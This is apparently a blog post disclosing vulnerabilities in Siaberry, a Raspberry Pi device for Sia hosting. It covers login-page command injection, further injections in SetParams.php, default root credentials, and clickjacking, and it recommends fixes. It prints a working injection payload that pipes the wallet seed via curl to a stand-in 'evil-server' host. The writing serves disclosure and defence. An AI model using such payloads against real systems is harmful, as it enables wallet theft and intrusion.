description: A write up of several security vulnerabilities I discovered in Siaberry,
  including command-injection, clickjacking, and more
---

Today, I'd like to share several interesting vulnerabilities I discovered in Siaberry, a Raspberry Pi-based hardware device that earns cryptocurrency on behalf of its owner.

Sia is a decentralized marketplace for buying and selling storage space. Siaberry earn money by offering storage on Sia, but it's worth noting that the two organizations have no formal partnership. Although it's not a perfect analogy, you can think of a Siaberry as a cryptocurrency miner for Sia's utility token, Siacoin.

I run a Sia host on [my Synology NAS](https://mtlynch.io/sia-via-docker/), but I like Raspberry Pis, and I was drawn to Siaberry's promise of a user-friendly web UI to manage my node. I installed the SiaberryOS onto my Pi, and I was blown away by how many serious issues I discovered within just a few hours.

# Command injection: Working exploit

The most interesting vulnerability I found was a command-injection vulnerability on the login page.

In the video below, I demonstrate how an attacker can extract the victim's Sia wallet private key simply by entering a particular string in the web app's password field:

# How the command injection worked

The vulnerability is so obvious that many developers and security experts could tell you exactly what the code looks like simply from the video demo above. I'll confirm your suspicions.

The problem occurs in [`ActionPage.php`](https://github.com/ketetefid/SiaBerry-WebUI/blob/f6750af815d865835c21ce4de659900c5e5e13b7/ActionPage.php#L9-L11):

```php
$user=$_POST['uname'];
$pass=$_POST['psw'];
exec("sudo bin/checker $user $pass", $output, $exitcode);
```

That's it. That's the whole vulnerability.

Siaberry is taking untrusted input directly from an HTTP POST request and executing it in the shell. This is a painfully easy vulnerability to exploit.

# Exploitation

To exploit this, I created an attack server called `evil-server`. From that machine, I started netcat to dump all traffic it received on port 5555. For convenience, I used a server on my local network, but the same attack would work with any server address, remote or local.

I then used `foo` as the username and supplied a password of `badpassword || curl -d "$(siac wallet seeds)" -X POST evil-server:5555`.

When `ActionPage.php` reaches its `exec` line, the command it executes is:

```bash
sudo bin/checker foo badpassword || \
  curl -d "$(siac wallet seeds)" -X POST evil-server:5555
```

This actually causes the shell to execute three different commands. The first is the command that Siaberry *meant* to execute:

```bash
sudo bin/checker foo badpassword
```

This returns a non-zero exit code because `foo` / `badpassword` is a bad username / password combination. Therefore, the shell begins executing the other side of the `||`, starting with the embedded command:

```bash
siac wallet seeds
```

This runs `siac`, the Sia command-line interface. That particular command dumps the Sia wallet seed to the console. The wallet seed is a 29-word passphrase that represents the wallet's private key. Anyone who has this passphrase can completely control all funds in the victim's wallet.

```bash
curl -d "$(siac wallet seeds)" -X POST evil-server:5555
```

Finally, the curl command makes an HTTP POST request to `http://evil-server:5555`, sending the Sia wallet seed as the payload. The attacker, capturing messages on port 5555, simply records the victim's wallet seed and empties the associated wallet.

# Where have I heard this before?

Interestingly, reddit commenters [warned of this exact vulnerability seven months ago](https://www.reddit.com/r/siacoin/comments/775ze7/introducing_siaberrywebuisiaberryos12_the/dok9nv9/?st=ji2plpxa&sh=04f72765). They failed to find a working exploit, but they correctly noted the dangerous pattern of placing user-controlled data into `exec` calls.

Siaberry's developer, Kete Tefid, dismissed their warnings and insisted that calls to `shell_exec` were perfectly safe:

{% include image.html file="shell-exec-is-safe.png" alt="Siaberry developer ignores warnings about this attack" img_link="true" border="true" %}

Kete then edited [his Siaberry release announcement](https://redd.it/775ze7) to include this note:

>A word on **security**
>
>TLDR; It ***is*** secure.
>
>I have put much time into the software to make sure that everything works accordingly. I myself have checked things and tried to break possible forms **literally** more than **a thousand times** to the point that I was certain that I myself cannot somehow break it and get unauthorized access.

# Why the impact is still low

Though arbitrary command injection on the login screen might seem scary, the effective impact for this issue is low.

There are very few Siaberry users in the wild, probably on the order of dozens. Of the few hosts that are actually running Siaberry, none of them appear to have configured their devices to accept requests from the Internet.

Another factor that could have amplified the impact of this vulnerability would be if Siaberry were vulnerable to [cross-site request forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) (CSRF). A CSRF attack is one in which the attacker convinces the victim to visit a malicious web page, then uses JavaScript to force the victim's browser to make arbitrary HTTP requests to a different site.

If Siaberry were vulnerable to CSRF attacks, the command injection vulnerability would be a lot scarier because the attacker could take control of any Siaberry device simply by convincing anyone on the device's local network to visit a malicious website.

Fortunately, Siaberry uses CSRF tokens to defend against this class of attack. I was not able to find any way to bypass Siaberry's CSRF protections.

# Siaberry architecture is fundamentally insecure

Siaberry's command injection vulnerability is not a matter of making a single, careless mistake. It's the result of an entire application architecture that is fundamentally insecure.

## Interprocess communication via shell commands

Siaberry's web app comes bundled with 25 shell scripts in the [`bin/` folder](https://github.com/ketetefid/SiaBerry-WebUI/tree/e997d06c07bcba1473b72cd2f894b89e58c0471e/bin). The web app is responsible for executing these scripts through PHP `exec` or `shell_exec` calls, many of them with sudo privileges.

If the attacker controls the command string, they can inject commands and trick Siaberry into executing them, as shown with the vulnerability above.

It's certainly possible to prevent command injection by restricting user inputs and sanitizing them for the shell, but the code has to get it right every single time or it introduces a vulnerability. It's much safer to avoid shell commands entirely as a form of interprocess communication. There are plenty of other ways for apps to communicate where the communication channel itself cannot accidentally execute arbitrary code as a side effect.

## Excessive web app privileges

Siaberry is a multi-tier application. The part the user sees is the web app frontend, but there are many background processes the user interacts with indirectly through the web app, including the Sia daemon itself.

In any multi-tier application, the web app is the most likely component to be compromised because it handles a large amount of untrusted user input. Because of this, secure architectures follow the [principle of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) in which they  strictly limit the web app's permissions. That way, if an attacker compromises the web app, they don't gain control of the entire system.

Siaberry doesn't follow this principle, at least not fully. To give credit where credit is due, the web app doesn't launch as `root`, and it can only run a whitelist of executables with sudo privileges. Unfortunately, the fact that it runs anything as sudo is messy and makes it more difficult to secure.

# My recommendations

## Short term: Use `escapeshellarg`

The very first note in PHP's documentation for `exec` warns developers that they must escape any user-controllable input they pass to this function:

{% include image.html file="exec-warning.png" alt="Warning in PHP documentation to escape shell arguments" fig_caption="Warning in PHP's documentation instructing developers to escape arguments to exec()" img_link="true" %}

As a short-term patch, Siaberry should wrap all user-controlled shell arguments using the [`escapeshellarg` function](https://secure.php.net/manual/en/function.escapeshellarg.php). This would mitigate attacks where the attacker can inject commands into variables by abusing shell metacharacters.

It's not a good long-term solution because doing interprocess communication throughs shell commands is fundamentally dangerous, but it would be a good stopgap until Siaberry migrates to a more robust design.

## Long term: Use a privileged broker process

The long-term fix requires Siaberry to address the weaknesses in its architecture. I believe the best way to do this is through a privileged broker process.

The broker process would run in a separate user context from the web app. It would have permissions to perform privileged actions that Siaberry needs, such as formatting a USB drive.

The broker process should offer an interprocess communication channel that doesn't risk side effects, such as an HTTP REST service over a `localhost` port.

Additionally, the broker process should be the only process that can communicate directly with Sia. This can be achieved by configuring Sia to require a password for API calls and allowing only the broker process to have access to the password.

I'd go a step further and run the web app within a Docker container so that if it's compromised, the attacker has access only to the container and not the full system. The attacker would only be able to perform actions that the web app is allowed to perform. They couldn't dump private keys, as in the exploit demo above, because that's not something that the web app currently needs to do.

With the heavy lifting delegated to the broker, Siaberry could remove all the dangerous `exec` and `exec_shell` commands from its code and [harden its PHP configuration](http://www.madirish.net/199) so that it can't execute arbitrary shell commands even in the case of bugs in the web app.

# Reporting the vulnerability to Siaberry

I reported this vulnerability to Siaberry on 2018-04-01 (unrelated to [April Fool's Day](/every-siacoin-review-ever/)). Kete, Siaberry's developer, was skeptical that the issue was exploitable, but eventually agreed after I sent him a video demo.

Kete rejected both my short- and long-term recommendations. He told me that Siaberry was intentionally designed so that the web app would have special privileges. He declined my suggestion of a privileged broker by claiming that it's equal in risk to a privileged web app and adds unnecessary complexity. I cited the principle of least privilege and highlighted the fact that web apps need to process a large volume of untrusted user input, but Kete insisted it would be "a complete reinvention of the wheel."

I reported several other security findings to Kete, but he dismissed almost all of them by insisting that they were deliberate engineering tradeoffs Siaberry made to facilitate ease of use.

# Failure to agree on disclosure timeline

After reporting the issues I found, I told Kete that I planned to publish my findings but wanted to give him sufficient time to implement fixes and deploy them to customer devices.

At only ~2,000 lines of code, Siaberry's web app is relatively small. I was expecting Kete to give me a fix timeline at the scale of days or weeks. I was floored when he told me he needed **six months**.

Given the size of the application, I felt that six months was a completely unreasonable request. I told Kete that I could give him at most 60 days. At this, Kete became irate and has since refused all communication with me.

{% include image.html file="disclosure-disagreement.png" alt="Siaberry developer disagrees with me about disclosure timeline for these vulnerabilities" max_width="465px" img_link="true" %}

# Siaberry's brittle fix

The following day, I saw that Kete applied [a hacky, superficial fix](https://github.com/ketetefid/SiaBerry-WebUI/commit/0637ec88ca623b754907d73c325f58b917c5ed6b) to `ActionPage.php`:

```php
$user=$_POST['uname'];
$pass=$_POST['psw'];
if (preg_match('/^[a-z0-9]*$/',$user) && preg_match('/^[a-zA-Z0-9*!@#^_]*$/',$pass)) {
  ...
  exec("sudo bin/checker $user $pass", $output, $exitcode);
```

This does indeed break my proof of concept exploit, but it's a weak fix. It eliminates most interesting shell metacharacters, but in a very "roll your own" fashion.

I can't think of a bypass, but I also wouldn't be surprised if someone found a clever way to evade the filter by abusing character encoding, regex subtleties, or quirks of shell interpretation. I'd have much more confidence in the [`escapeshellarg` function](https://secure.php.net/manual/en/function.escapeshellarg.php) because it's purpose-built to prevent this exact attack.

# The rest of my security findings, in brief

In addition to the login vullnerability above, I reported several additional vulnerabilities to Siaberry that they never fixed.

It has now been over 60 days, which I feel was sufficient time for Siaberry to make a good-faith effort to implement fixes. In that time, Siaberry has made only two changes to the web app, totalling less than 10 lines of changes. 

I don't believe that Siaberry has any intention of fixing the vulnerabilities I reported to them, so I am disclosing the remaining issues below.

## A dozen more command injection vulnerabilities

The login bypass vulnerability I described above was interesting in that it did not require authentication. There are many more command injection vulnerabilities in the code that follow a similar pattern, but they're only accessible to authenticated users.

In the file [SetParams.php](https://github.com/ketetefid/SiaBerry-WebUI/blob/e997d06c07bcba1473b72cd2f894b89e58c0471e/js/SetParams.php), there are twelve instances where Siaberry blindly executes user-supplied strings like this:

```php
if(isset($_POST['siadirval'])){
  $siadir = $_POST['siadir'];
  $siadirval = $_POST['siadirval'];
  exec("../bin/SetParams '$siadir' '$siadirval'");
}
```

## Siaberry uses insecure SSH settings

Siaberry ships with SSH enabled by default. Further, Siaberry allows SSH login by `root` which is generally considered poor security practice.

At first glance, this seems forgiveable given that Siaberry is meant to run headless (no physical display). Then I realized that [Siaberry's documentation](http://www.siaberry.com/SiaBerry-v1.2.3-QuickStart.pdf) doesn't mention SSH at all, so users get all the risk of enabling remote access with none of the benefits.

## Siaberry uses insecure default credentials

Both the standard user account and the `root` account use a default password of `siaberry`. The app never prompts the user to change these default credentials.

The documentation [recommends](http://www.siaberry.com/SiaBerry-v1.2.3-QuickStart.pdf) that the user reset their passwords, but a user who skips the documentation could very well use Siaberry without ever realizing they're supposed to change their password or that there's even a `root` password to change.

## Siaberry is vulnerable to clickjacking

[Clickjacking](https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/) is an attack in which the attacker lures the victim to a malicious website and then induces the user to click the screen. Unbeknownst to the victim, they're actually clicking buttons on a completely different website that the attacker has overlayed in an invisible iframe.

As the name implies,a  clickjacking attack is limited to clicks, so it's not possible for the attacker to attack Siaberry in any way that requires typing (e.g. sending victim funds to an attacker-controlled address). There is plenty that Siaberry allows the user to do purely through cliks, such as reformatting the victim's flash drive, which would cause them to default on all of their Sia storage contracts and lose all their collateral.

{% include image.html file="format-flash.png" alt="Screenshot of Siaberry offering to format flash drive" max_width="517px" img_link="true" %}

The fix is for Siaberry to simply to set the [`Content-Security-Policy: frame-ancestors` HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) in server responses, but the web app does not do this.

# Defense in depth

Siaberry's lack of response to these issues can perhaps be explained by [this comment](https://redd.it/775ze7) from Kete:

>Some friends have commented that putting foo in bar will make boo. The point is that you should first break into the login and get authorized access to be able to set foo in bar. Secondly, this is not a central, shared website which everyone can connect to. it is *your* OS; I do not know why a user would want to break his own OS after he logs into.
>
>-Kete Tefid, Siaberry developer

To understand the problem with this reasoning, imagine the following separate, hypothetical scenarios:

* **Scenario #1**: There's a CSRF vulnerability that allows anonymous users to modify the Sia directory path field in the Siaberry web app.
  * ***Naïve response***: "Who cares? Why would the attacker want to do that?"
* **Scenario #2**: There's a command-injection vulnerability that allows an attacker to execute arbitrary commands by setting the Sia directory path field in the web app to a specially crafted value, but they have to be logged in to do it.
  * ***Naïve response***: "Who cares? Why would an authenticated user attack themselves?"

Separately, these vulnerabilities are harmless, but together, they're very dangerous.

Secure systems protect not only their external perimeter, but their inner defenses as well. This is known as [defense in depth](https://en.wikipedia.org/wiki/Defense_in_depth_(computing)). You can never *know* that the vulnerability you see is the only one in the system. The right decision in most cases is to fix it so that it doesn't increase the severity of attacks you were unable to anticipate (TODO: simplify).

* **2018-06-11**: My 60-day blackout window elapses. I publicly disclose all issues that I reported to Siaberry.

# Conclusion: Avoid Siaberry

For a host to earn money on the Sia network, it needs to keep a hot wallet carrying sufficient Siacoins to offer collateral to guarantee its contracts. It's not unusual for the value of Siacoins in the host's wallet to reach hundreds to thousands of US dollars' worth of Siacoin.

Whenever you give software access to your Sia wallet, you're increasing the risk that it will be compromised. If the software provides high value and has robust security, this tradeoff can be worthwhile.

Siaberry does not demonstrate an understanding or commitment to security. I don't believe they are trustworthy custodians of your Siacoin, so I recommend against anyone using Siaberry software to manage their Sia node.
